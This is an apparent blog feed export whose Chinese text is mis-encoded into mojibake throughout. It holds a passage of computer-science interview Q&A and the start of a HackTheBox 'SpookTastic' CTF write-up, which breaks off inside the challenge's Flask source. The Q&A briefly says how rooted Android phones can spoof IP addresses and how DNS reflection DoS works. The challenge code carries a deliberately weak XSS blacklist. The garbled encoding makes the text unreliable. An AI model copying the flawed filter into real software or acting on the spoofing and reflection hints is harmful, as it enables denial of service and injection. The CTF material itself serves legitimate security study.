åŸºç¤æ¶æ§‹ï¼ŒåŒ…å«è™›æ“¬æ©Ÿå™¨ã€å„²å­˜ã€ç¶²è·¯ç­‰è³‡æºã€‚ä½¿ç”¨è€…å¯ä»¥ç›´æ¥ç®¡ç†å’Œæ§åˆ¶é€™äº›åŸºç¤è¨­æ–½ï¼ˆå¦‚é¸æ“‡ä½œæ¥­ç³»çµ±ã€å®‰è£è»Ÿé«”ï¼‰ï¼Œä½†ä¸éœ€è¦ç¶­è­·å¯¦é«”ç¡¬é«”ã€‚ä¾‹å­ï¼šAmazon Web Services (AWS) EC2ã€Microsoft Azure Virtual Machinesã€Google Compute Engineã€‚</li><li>PaaSï¼ˆPlatform as a Serviceï¼‰æä¾›çš„æ˜¯å¹³å°å±¤ç´šçš„æœå‹™ï¼ŒåŒ…å«é‹è¡Œæ‡‰ç”¨æ‰€éœ€çš„ä½œæ¥­ç³»çµ±ã€ä¸­ä»‹è»Ÿé«”å’Œé–‹ç™¼å·¥å…·ç­‰åŸºç¤è¨­æ–½ã€‚é–‹ç™¼è€…å¯ä»¥åœ¨é€™å€‹å¹³å°ä¸Šé–‹ç™¼ã€é‹è¡Œå’Œç®¡ç†æ‡‰ç”¨ç¨‹å¼ï¼Œè€Œä¸éœ€è¦è™•ç†åº•å±¤çš„åŸºç¤æ¶æ§‹ã€‚ä¾‹å­ï¼šGoogle App Engineã€Microsoft Azure App  </li><li>SaaS (Software as a Service) æ˜¯ä¸€ç¨®è»Ÿé«”æœå‹™æ¨¡å¼ï¼Œç”¨æˆ¶å¯ä»¥é€éç¶²è·¯ç›´æ¥ä½¿ç”¨è»Ÿé«”æ‡‰ç”¨ç¨‹å¼ï¼Œç„¡éœ€å®‰è£ã€é…ç½®å’Œç®¡ç†è»Ÿé«”ã€‚é€™äº›è»Ÿé«”é€šå¸¸é‹è¡Œåœ¨æä¾›å•†çš„ä¼ºæœå™¨ä¸Šï¼Œä¸¦é€éç€è¦½å™¨æˆ–å®¢æˆ¶ç«¯æ‡‰ç”¨ç¨‹å¼ä¾†è¨ªå•ã€‚ä¾‹å­ï¼šGoogle Workspace (å¦‚ Gmailã€Google Drive)ã€Salesforceã€Microsoft 365ã€‚</li></ul></li><li><p>Q: VM è·Ÿ Container å·®åœ¨å“ªè£¡ï¼Œåˆ†åˆ¥é©åˆä»€éº¼æ™‚å€™ç”¨?<br>A: </p><table><thead><tr><th>ç‰¹å¾µ</th><th>VMï¼ˆVirtual Machineï¼‰</th><th>Container</th></tr></thead><tbody><tr><td><strong>æ¶æ§‹</strong></td><td>åŒ…å«å®Œæ•´çš„ OSï¼ŒåŒ…æ‹¬å…§æ ¸å’Œæ‡‰ç”¨ç¨‹å¼</td><td>å…±ç”¨å®¿ä¸»æ©Ÿçš„ OS å…§æ ¸ï¼ŒåªåŒ…å«æ‡‰ç”¨å’Œä¾è³´</td></tr><tr><td><strong>å•Ÿå‹•é€Ÿåº¦</strong></td><td>æ…¢ï¼ˆéœ€è¦å®Œæ•´çš„ä½œæ¥­ç³»çµ±å•Ÿå‹•æ™‚é–“ï¼‰</td><td>å¿«ï¼ˆç§’ç´šåˆ¥å•Ÿå‹•ï¼‰</td></tr><tr><td><strong>è³‡æºä½¿ç”¨</strong></td><td>é‡ï¼ˆæ¯å€‹ VM éœ€è¦ç¨ç«‹çš„ OSï¼Œæ¶ˆè€—æ›´å¤šè³‡æºï¼‰</td><td>è¼•ï¼ˆå…±ç”¨å…§æ ¸ï¼Œè³‡æºéœ€æ±‚ä½ï¼‰</td></tr><tr><td><strong>éš”é›¢æ€§</strong></td><td>é«˜ï¼ŒVM ä¹‹é–“å®Œå…¨éš”é›¢</td><td>ä¸­ç­‰ï¼Œå…±ç”¨å…§æ ¸ä½†ä»å…·å‚™ä¸€å®šç¨‹åº¦çš„éš”é›¢æ€§</td></tr><tr><td><strong>å¯ç§»æ¤æ€§</strong></td><td>å—é™æ–¼ä¸åŒçš„è™›æ“¬åŒ–æŠ€è¡“å’Œç’°å¢ƒ</td><td>é«˜ï¼Œå¯ä»¥åœ¨ä»»ä½•æ”¯æŒå®¹å™¨çš„å¹³å°ä¸Šé‹è¡Œ</td></tr><tr><td><strong>ç®¡ç†</strong></td><td>éœ€è¦ç®¡ç†æ•´å€‹ä½œæ¥­ç³»çµ±å’Œæ‡‰ç”¨ç¨‹å¼</td><td>åªéœ€ç®¡ç†æ‡‰ç”¨å’Œä¾è³´</td></tr></tbody></table><p>ç¸½çµï¼š</p><ul><li>VM æä¾›è¼ƒé«˜çš„éš”é›¢æ€§å’Œå®Œæ•´çš„æ“ä½œç³»çµ±ç’°å¢ƒï¼Œé©åˆå¤šä½œæ¥­ç³»çµ±éœ€æ±‚æˆ–å®‰å…¨æ€§è¦æ±‚è¼ƒé«˜çš„æ‡‰ç”¨ã€‚</li><li>Container å‰‡è‘—é‡è¼•é‡å’Œå¿«é€Ÿå•Ÿå‹•ï¼Œéå¸¸é©åˆ DevOps æµç¨‹ã€å¾®æœå‹™æ¶æ§‹å’Œé›²ç«¯åŸç”Ÿæ‡‰ç”¨ã€‚</li></ul></li><li><p>Q: ç°¡å–®èªªæ˜ Hash ä¸¦åˆ—å‡ºå…©å€‹ Hash çš„ç‰¹æ€§<br>A: Hash æ˜¯ä¸€ç¨®å°‡è¼¸å…¥æ•¸æ“šï¼ˆä¾‹å¦‚æ–‡å­—æˆ–æ–‡ä»¶ï¼‰é€éç‰¹å®šæ¼”ç®—æ³•è½‰æ›ç‚ºå›ºå®šé•·åº¦çš„å­—ä¸²ï¼ˆç¨±ç‚º hash å€¼æˆ– hash ç¢¼ï¼‰çš„æŠ€è¡“ã€‚é€™ç¨®è½‰æ›æ˜¯å–®å‘çš„ï¼Œå³å¾ˆé›£æˆ–ä¸å¯èƒ½å¾ hash å€¼é‚„åŸåŸå§‹æ•¸æ“šã€‚Hash å¸¸ç”¨æ–¼æ•¸æ“šå®Œæ•´æ€§é©—è­‰ã€å¯†ç¢¼å­˜å„²å’Œæ•¸ä½ç°½ç« ã€‚<br>Hash çš„å…©å€‹ç‰¹æ€§ï¼š</p><ul><li>ä¸å¯é€†æ€§<br>Hash æ˜¯å–®å‘çš„ï¼Œç†è«–ä¸Šç„¡æ³•å¾ hash å€¼åæ¨å‡ºåŸå§‹æ•¸æ“šã€‚é€™ä½¿å¾— hash é©åˆç”¨æ–¼å¯†ç¢¼å­˜å„²å’Œæ•¸æ“šéš±ç§ä¿è­·ã€‚</li><li>ç¢°æ’æŠ—æ€§<br>ç¢°æ’æŠ—æ€§è¡¨ç¤ºå¾ˆé›£æ‰¾åˆ°å…©çµ„ä¸åŒçš„è¼¸å…¥æœƒç”¢ç”Ÿç›¸åŒçš„ hash å€¼ã€‚ç†æƒ³æƒ…æ³ä¸‹ï¼Œå…©å€‹ä¸åŒçš„è¼¸å…¥æ•¸æ“šæ‡‰è©²æœ‰ä¸åŒçš„ hash å€¼ï¼Œä»¥é˜²æ­¢ç¢°æ’æ”»æ“Šï¼ˆCollision Attackï¼‰ã€‚</li></ul></li><li><p>Q: Lex å’Œ Yacc æ˜¯ä»€éº¼ï¼Ÿ<br>A: </p><ul><li>Lex æ˜¯ä¸€å€‹è©æ³•åˆ†æå™¨ç”Ÿæˆå™¨ï¼Œå®ƒè² è²¬å°‡è¼¸å…¥çš„æ–‡å­—åˆ†è§£æˆè©ç´ ï¼ˆTokenï¼‰ï¼Œä¹Ÿå°±æ˜¯ç¨‹å¼ç¢¼çš„æœ€å°èªæ³•å–®ä½ï¼Œä¾‹å¦‚é—œéµå­—ã€è®Šæ•¸åã€æ•¸å­—ç­‰ã€‚Lex æœƒä¾ç…§è¦å‰‡è­˜åˆ¥é€™äº›è©ç´ ï¼Œä¸¦ç‚ºæ¯å€‹è©ç´ åˆ†é…ä¸€å€‹ç‰¹å®šçš„å‹åˆ¥ï¼ˆToken typeï¼‰ï¼Œä¾›èªæ³•åˆ†æå™¨ï¼ˆå¦‚ Yaccï¼‰é€²è¡Œè™•ç†ã€‚</li><li>Yacc æ˜¯ä¸€å€‹èªæ³•åˆ†æå™¨ç”Ÿæˆå™¨ï¼Œå®ƒä½¿ç”¨ä¾†è‡ª Lex çš„è©ç´ ä¾†æ§‹å»ºèªæ³•æ¨¹æˆ–è§£ææ¨¹ã€‚Yacc ä½¿ç”¨ä¸Šä¸‹æ–‡ç„¡é—œæ–‡æ³•ï¼ˆCFGï¼‰ä¾†æè¿°èªæ³•çµæ§‹ï¼Œä¸¦åŸºæ–¼é€™äº›è¦å‰‡è§£æè©ç´ çš„çµæ§‹ã€‚Yacc çš„å…¨ç¨±æ˜¯ â€œYet Another Compiler Compilerâ€ã€‚</li></ul><p>å¯¦ä¾‹èªªæ˜ï¼š<br>å‡è¨­æˆ‘å€‘è¦è§£æä¸€å€‹ç°¡å–®çš„æ•¸å­¸è¡¨é”å¼ 3 + 5 * (2 - 1)ï¼š</p><ul><li>Lex è² è²¬åˆ†è§£ç‚ºè©ç´ ï¼š3ã€+ã€5ã€*ã€(ã€2ã€-ã€1ã€)</li><li>Yacc æ ¹æ“šé‹ç®—è¦å‰‡ï¼ˆä¾‹å¦‚å…ˆä¹˜é™¤å¾ŒåŠ æ¸›ï¼‰æ§‹å»ºèªæ³•æ¨¹ï¼Œè§£é‡‹é€™å€‹è¡¨é”å¼çš„çµæ§‹å’Œé †åº</li></ul></li><li><p>Q: C çš„ Functional Pointer ç›¸é—œå•é¡Œ<br>A: æš«æ™‚è·³é</p></li><li><p>Q: é›œæ¹Šå‡½æ•¸ Hash,å¸¸è¦‹çš„ä¾‹å­<br>A: </p><ul><li>MD5ï¼ˆMessage Digest Algorithm 5ï¼‰<ul><li>ç‰¹æ€§ï¼šç”¢ç”Ÿ 128 ä½å…ƒï¼ˆ16 å­—ç¯€ï¼‰çš„é›œæ¹Šå€¼ï¼Œé€Ÿåº¦å¿«ï¼Œé©åˆå¿«é€ŸæŸ¥æ‰¾æˆ–é©—è­‰ã€‚</li><li>ç”¨é€”ï¼šæ—©æœŸç”¨æ–¼æ•¸æ“šå®Œæ•´æ€§é©—è­‰å’Œå¯†ç¢¼å„²å­˜ï¼Œä½†ç”±æ–¼å¼±æŠ—ç¢°æ’æ€§ï¼ˆå®¹æ˜“æ‰¾åˆ°å…©å€‹ä¸åŒè¼¸å…¥ç”¢ç”Ÿç›¸åŒçš„é›œæ¹Šå€¼ï¼‰ï¼Œç¾åœ¨å·²ä¸å»ºè­°ç”¨æ–¼å®‰å…¨æ•æ„Ÿçš„æ‡‰ç”¨ã€‚</li></ul></li><li>SHA-256ï¼ˆSecure Hash Algorithm 256ï¼‰<ul><li>ç‰¹æ€§ï¼šå±¬æ–¼ SHA-2 ç³»åˆ—ï¼Œç”¢ç”Ÿ 256 ä½å…ƒï¼ˆ32 å­—ç¯€ï¼‰çš„é›œæ¹Šå€¼ï¼Œå…·æœ‰è¼ƒé«˜çš„æŠ—ç¢°æ’æ€§ã€‚</li><li>ç”¨é€”ï¼šç›®å‰åœ¨è¨±å¤šå®‰å…¨å ´æ™¯ä¸­è¢«å»£æ³›ä½¿ç”¨ï¼Œå¦‚æ•¸æ“šç°½åã€å€å¡Šéˆå’Œè­‰æ›¸é©—è­‰ã€‚</li></ul></li></ul></li><li><p>Q: Android IP Spoofing æ˜¯ä»€éº¼ï¼Ÿ<br>A: Android IP Spoofing æ˜¯ä¸€ç¨®ç¶²è·¯æ”»æ“ŠæŠ€è¡“ï¼Œé€šéå½é€  IP åœ°å€ä¾†æ©è“‹ç™¼é€ç«¯çš„çœŸå¯¦èº«ä»½ï¼Œä»¥å¯¦ç¾æœªç¶“æˆæ¬Šçš„æ•¸æ“šè¨ªå•æˆ–ç¹éå®‰å…¨é™åˆ¶ã€‚é€™ç¨®æŠ€è¡“é€šå¸¸è¢«ç”¨ä¾†ç™¼èµ·åˆ†ä½ˆå¼æ‹’çµ•æœå‹™æ”»æ“Šï¼ˆDDoSï¼‰æˆ–ç¹éåŸºæ–¼ IP çš„é˜²ç«ç‰†ç­‰ã€‚IP spoofing ä¸¦ä¸å±€é™æ–¼ Android å¹³å°ï¼Œä½†åœ¨ Android è¨­å‚™ä¸Šï¼Œæ”»æ“Šè€…å¯ä»¥åˆ©ç”¨ç‰¹å®šçš„ç¶²è·¯å·¥å…·æˆ–è‡ªå®šç¾©æ‡‰ç”¨ç¨‹åºä¾†å½é€ ç™¼é€ç«¯çš„ IP åœ°å€ã€‚</p></li></ol><h4 id="109-è€ƒå¤é¡Œ"><a href="#109-è€ƒå¤é¡Œ" class="headerlink" title="109 è€ƒå¤é¡Œ"></a>109 è€ƒå¤é¡Œ</h4><ul><li><a class="link"   href="https://hackmd.io/@splitline/BkALfYY5r" >https://hackmd.io/@splitline/BkALfYY5r <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li>   Q: Node.js çš„å‡ºç¾æœ‰ä»€éº¼å¾ˆå¤§çš„å½±éŸ¿ï¼Ÿå®ƒæœ‰ä»€éº¼ç‰¹è‰²ï¼Ÿ<br>  A: Node.js æ”¹è®Šäº†å¾Œç«¯é–‹ç™¼çš„æ–¹å¼ï¼Œå…è¨±ä½¿ç”¨ JavaScript å»ºæ§‹éåŒæ­¥ã€äº‹ä»¶é©…å‹•çš„é«˜æ•ˆèƒ½æ‡‰ç”¨ã€‚ç‰¹è‰²åŒ…æ‹¬å–®åŸ·è¡Œç·’æ¨¡å‹ã€é«˜æ•ˆèƒ½ I&#x2F;O è™•ç†ã€æ”¯æ´ NPM ç­‰æ¨¡çµ„åŒ–è¨­è¨ˆã€‚</li><li>   Q: æ¯”è¼ƒåˆ†æ React vs Vue æˆ– Angular æˆ–ä½ ç”¨éçš„å‰ç«¯æ¡†æ¶<br>  A: React å´é‡æ–¼ UI å…ƒä»¶åŒ–ã€å¯é‡è¤‡åˆ©ç”¨å’Œå¿«é€Ÿæ¸²æŸ“ï¼›Vue æ˜“æ–¼å­¸ç¿’ã€é›™å‘æ•¸æ“šç¶å®šã€éˆæ´»æ€§é«˜ï¼›Angular æ˜¯å®Œæ•´æ¡†æ¶ï¼Œæ“æœ‰å¼·é¡å‹æ”¯æ´å’Œå®Œæ•´å·¥å…·éˆï¼Œé©åˆå¤§å‹æ‡‰ç”¨ã€‚</li><li>   Q: å¸¸ç”¨çš„ç¶²ç®¡å·¥å…·æœ‰å“ªäº›ï¼Ÿ<br>  A: å¸¸ç”¨å·¥å…·åŒ…æ‹¬ Wiresharkã€Nagiosã€Zabbixã€Prometheusã€Grafana å’Œ Nmapï¼Œé€™äº›å·¥å…·å¹«åŠ©ç›£æ§ç¶²çµ¡æµé‡ã€ä¼ºæœå™¨å¥åº·åº¦ã€æ•ˆèƒ½å’Œå®‰å…¨æ€§ã€‚</li><li>   Q: å¦‚ä½•æ’°å¯« int freq_mode(int a, int b, int c, int d)ï¼Œå›å‚³çœ¾æ•¸å‡ºç¾çš„æ¬¡æ•¸ï¼Ÿ<br>  A: é€éä½¿ç”¨ STL çš„ std::map æˆ– unordered_map ä¾†è¨ˆç®—æ¯å€‹æ•¸å­—çš„å‡ºç¾æ¬¡æ•¸ï¼Œæ‰¾å‡ºæœ€é«˜æ¬¡æ•¸å³å¯ã€‚</li><li>   Q: å¦‚ä½•å¯¦ä½œåŒ…è¦†ä¸‰ç¶­å¹³é¢ä¸Šçš„ n å€‹é»çš„çƒå‹ï¼ŒåŠå¾‘å¿…é ˆå°æ–¼æœ€å°è§£çš„å…©å€ï¼Œä¸”é”åˆ° O(n) è§£ï¼Ÿ<br>  A: å¯ä½¿ç”¨ Welzlâ€™s Algorithmï¼Œé€é»éš¨æ©Ÿæ”¾ç½®åˆ°çƒé«”ä¸­ï¼Œé‡è¤‡è‡³åŒ…è¦†æ‰€æœ‰é»ã€‚æ­¤æ–¹æ³•é”æˆ O(n) è¤‡é›œåº¦ã€‚</li><li>   Q: å¦‚ä½•æ‰¾å‡ºé™£åˆ— int A[n] ç¬¬äºŒå°çš„æ•¸ä¸¦é”æˆ O(n) è§£ï¼Ÿ<br>  A: ä½¿ç”¨ç·šæ€§æƒæéæ¿¾å‡ºæœ€å°å’Œç¬¬äºŒå°çš„å…ƒç´ ï¼Œè—‰ç”±ä¸€æ¬¡éæ­·é”åˆ° O(n) è¤‡é›œåº¦ï¼Œç„¡æ³•æ¯” Î©(n) æ›´å¿«ã€‚</li><li>   Q: memory allocation å¤ªæ…¢æ€éº¼ debugï¼Ÿå¯ä»¥ç”¨ä»€éº¼å·¥å…·è§£æ±ºï¼Ÿ<br>  A: ä½¿ç”¨ valgrind çš„ massif æˆ– perf å·¥å…·æª¢æŸ¥è¨˜æ†¶é«”åˆ†é…å•é¡Œï¼›å¯é€éè¨˜æ†¶é«”æ± ï¼ˆmemory poolï¼‰æ”¹å–„æ•ˆç‡ã€‚</li><li>   Q: IDSï¼ˆå…¥ä¾µæª¢æ¸¬ç³»çµ±ï¼‰å’Œ AVï¼ˆé˜²æ¯’è»Ÿé«”ï¼‰æœ‰ä½•ä¸åŒï¼Ÿå„æª¢æŸ¥ä»€éº¼ï¼Ÿç‚ºä»€éº¼å¾ˆé›£æ“‹ä½ APTï¼Ÿ<br>  A: IDS å´é‡æ–¼ç¶²è·¯æµé‡åˆ†æï¼ŒAV å´é‡æ–¼æª¢æ¸¬æª”æ¡ˆç‰¹å¾µç¢¼ã€‚APT è¼ƒéš±è”½ï¼Œåˆ©ç”¨å¤šå±¤æ¬¡å’ŒæŒä¹…æ€§ï¼Œé›£ä»¥å–®é  IDS å’Œ AV æ””æˆªã€‚</li><li>   Q: ç‚ºä»€éº¼ hashing åœ¨ Linux Kernel ä¸­é‚£éº¼å¸¸è¦‹ï¼Ÿ<br>  A: Hashing èƒ½å¤ å¿«é€ŸæŸ¥æ‰¾æ•¸æ“šï¼Œé©åˆè™•ç† Kernel ä¸­å¤§é‡æ•¸æ“šç®¡ç†çš„éœ€æ±‚ï¼Œå¦‚ç³»çµ±èª¿åº¦ã€æ–‡ä»¶å¿«å–å’Œç¶²è·¯è·¯ç”±ã€‚</li><li>   Q: èˆ‰ä¸€å€‹ä½ æœƒå¯¦ä½œçš„è¼ƒè¤‡é›œæ¼”ç®—æ³•ï¼Œä¸¦ç”¨ 30 å­—ç°¡ä»‹<br> A: Floyd-Warshall æ¼”ç®—æ³•ï¼Œç”¨æ–¼è¨ˆç®—æ‰€æœ‰é»å°é–“çš„æœ€çŸ­è·¯å¾‘ï¼Œè¤‡é›œåº¦ç‚º O(n^3)ï¼Œé©åˆå¯†é›†åœ–ã€‚</li><li>   Q: Stack å’Œ Queue åˆ†åˆ¥æ˜¯ä»€éº¼ï¼Ÿåˆ†åˆ¥é©ç”¨æ–¼ä»€éº¼æ¼”ç®—æ³•ï¼Ÿ<br> A: Stackï¼ˆå †ç–Šï¼‰ç‚ºå…ˆé€²å¾Œå‡ºï¼Œå¸¸ç”¨æ–¼éè¿´å’Œ DFSï¼›Queueï¼ˆä½‡åˆ—ï¼‰ç‚ºå…ˆé€²å…ˆå‡ºï¼Œé©ç”¨æ–¼ BFS å’Œæ’ç¨‹ã€‚</li><li>   Q: é–‹ç™¼ Linux Kernel æˆ– Driver æ™‚å¦‚ä½• debugï¼Ÿå¯ä»¥ä¸é‡æ–°ç·¨è­¯æ¸¬è©¦å¤šç­†è¼¸å…¥å—ï¼Ÿ<br> A: å¯ä½¿ç”¨ kgdbã€ftrace æˆ– dmesg é€²è¡Œ Kernel debugï¼Œå¯é€é debugfs æˆ–å‹•æ…‹ä¿®æ”¹ sysfs åƒæ•¸ä»¥æ¸¬è©¦ä¸åŒè¼¸å…¥ã€‚</li><li>   Q: Android æ‰‹æ©Ÿå¯ä»¥é€²è¡Œ IP Spoofing å—ï¼Ÿå¦‚ä½•æ“ä½œï¼Ÿ<br> A: å¯ä»¥ï¼Œåœ¨ Root æ¬Šé™ä¸‹ä½¿ç”¨ iptables æˆ–è‡ªè¨‚ Socket å¯«å…¥è‡ªè¨‚ IP åœ°å€é”åˆ° IP Spoofing æ•ˆæœã€‚</li><li>   Q: å¦‚ä½•åœ¨ Wi-Fi Router ä¸Šæ–°å¢ C ç¨‹å¼åŠŸèƒ½ï¼Ÿéœ€è¦å“ªäº›å·¥å…·ï¼Ÿ<br> A: ç·¨è­¯ OpenWRT&#x2F;DD-WRT æˆ–ä½¿ç”¨é–‹æºéŸŒé«” SDK ç·¨å¯«ï¼Œä½¿ç”¨äº¤å‰ç·¨è­¯å·¥å…·ã€ä¸²å£ç‡’éŒ„å’Œé©é…å™¨ã€‚</li><li>   Q: GMM å’Œ K-means æœ‰ä½•ä¸åŒï¼Ÿè«‹èªªæ˜åŸç†<br> A: K-means å‡è¨­æ¯å€‹å¢é›†å½¢ç‹€ç‚ºåœ“ï¼ŒGMM åˆ©ç”¨é«˜æ–¯åˆ†å¸ƒä¾†ä¼°è¨ˆï¼Œå…è¨±å„å¢é›†æœ‰ä¸åŒå½¢ç‹€ã€‚</li><li>   Q: Server è™›æ“¬åŒ–çš„å¥½è™•æ˜¯ä»€éº¼ï¼Ÿå¸¸ç”¨çš„å·¥å…·æœ‰å“ªäº›ï¼Ÿ<br> A: Server è™›æ“¬åŒ–å¢åŠ è³‡æºåˆ©ç”¨ç‡å’Œéš”é›¢æ€§ï¼Œå·¥å…·æœ‰ VMwareã€KVMã€Hyper-V å’Œ VirtualBox ç­‰ã€‚</li><li>   Q: è§£é‡‹åŠ é€Ÿæ–¹å¼ (a) SIMD (b) GPGPU (c) FPGA (d) MPI ä¸¦èˆ‰ä¾‹<br> A: (a) SIMD: å–®æŒ‡ä»¤å¤šæ•¸æ“šï¼Œå¦‚å‘é‡è¨ˆç®—ï¼›(b) GPGPU: ä½¿ç”¨ GPU åšä¸¦è¡Œé‹ç®—ï¼Œå¦‚ AI è¨“ç·´ï¼›(c) FPGA: å¯é‡çµ„é‚è¼¯ï¼ŒåŠ é€Ÿå°ˆç”¨è¨ˆç®—ï¼›(d) MPI: åˆ†æ•£å¼å¤šè™•ç†ï¼Œå¦‚è¶…ç´šè¨ˆç®—æ©Ÿã€‚</li><li>   Q: åµéŒ¯æ•ˆèƒ½ç“¶é ¸ (a) ç¨‹å¼ç“¶é ¸ (b) å¿«å–ç¼ºå¤± (c) å€åŸŸæ€§å•é¡Œ<br> A: (a) ç¨‹å¼ç“¶é ¸ï¼šåˆ†æ perfï¼›(b) å¿«å–ç¼ºå¤±ï¼šèª¿æ•´æ•¸æ“šçµæ§‹å’Œå­˜å–æ¨¡å¼ï¼›(c) å€åŸŸæ€§ï¼šæ”¹å–„è¨˜æ†¶é«”å€åŸŸæ€§ã€‚</li><li>   Q: DNS åå°„æ”»æ“Šå¦‚ä½•å¯¦ä½œï¼Ÿ<br> A: åˆ©ç”¨é–‹æ”¾çš„ DNS ä¼ºæœå™¨å°‡æŸ¥è©¢åå°„è‡³ç›®æ¨™ IPï¼Œé€ æˆæ‹’çµ•æœå‹™ï¼Œä½¿ç”¨å°è©¢å•å°åŒ…é€ æˆå¤§å›æ‡‰ã€‚</li><li>   Q: èªªæ˜ Attention æ©Ÿåˆ¶<br> A: Attention ç”¨æ–¼æå‡æ·±åº¦å­¸ç¿’æ¨¡å‹çš„æ•ˆèƒ½ï¼Œé€éé—œæ³¨é‡è¦éƒ¨åˆ†è³‡æ–™ï¼Œä½¿æ¨¡å‹æ›´é«˜æ•ˆå­¸ç¿’é—œéµç‰¹å¾µã€‚</li><li>   Q: ä½ çš„é–‹ç™¼ç’°å¢ƒï¼Ÿæœ‰ç„¡ GitHub å”ä½œç¶“é©—æˆ–ç¨‹å¼æª¢å®šç¶“é©—ï¼Ÿ<br> A: ä½¿ç”¨ VSCode å’Œ Gitï¼Œæ“æœ‰ GitHub å”ä½œç¶“é©—</li><li>   Q: ä½ è² è²¬çš„æœ€å…·æŒ‘æˆ°çš„å°ˆæ¡ˆæˆ–æˆå°±ï¼Ÿ<br> A: ç•¥</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„&quot;&gt;&lt;a href=&quot;#äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„&quot; class=&quot;headerlink&quot; title=&quot;äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„&quot;&gt;&lt;/a&gt;äº¤å¤§è³‡å·¥æ‰€ä¸™çµ„&lt;/h2&gt;&lt;h3 id=&quot;é¢è©¦&quot;&gt;&lt;a href=&quot;#é¢è©¦&quot; class=&quot;headerlink&quot; title=&quot;é¢</summary>
      
    
    
    
    
    <category term="education" scheme="https://kazma.tw/tags/education/"/>
    
    <category term="career" scheme="https://kazma.tw/tags/career/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SpookTastic Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/</id>
    <published>2024-11-02T05:39:19.850Z</published>
    <updated>2024-11-02T06:18:11.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>æˆ‘å€‘ç›´æ¥ä¾†çœ‹ä¸»ç¨‹å¼ï¼š</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, abort</span><br><span class="line"><span class="keyword">from</span> flask_socketio <span class="keyword">import</span> SocketIO</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">socketio = SocketIO(app)</span><br><span class="line"></span><br><span class="line">registered_emails, socket_clients = [], &#123;&#125;</span><br><span class="line"></span><br><span class="line">generate = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join([random.choice(string.hexdigits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line">BOT_TOKEN = generate(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_pass</span>(<span class="params">email</span>):</span><br><span class="line">    email = email.lower()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;script&quot;</span> <span class="keyword">in</span> email:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span>, ip <span class="keyword">in</span> socket_clients.items():</span><br><span class="line">        <span class="keyword">if</span> ip == user_ip:</span><br><span class="line">            socketio.emit(<span class="string">&quot;flag&quot;</span>, &#123;<span class="string">&quot;flag&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read()&#125;, room=<span 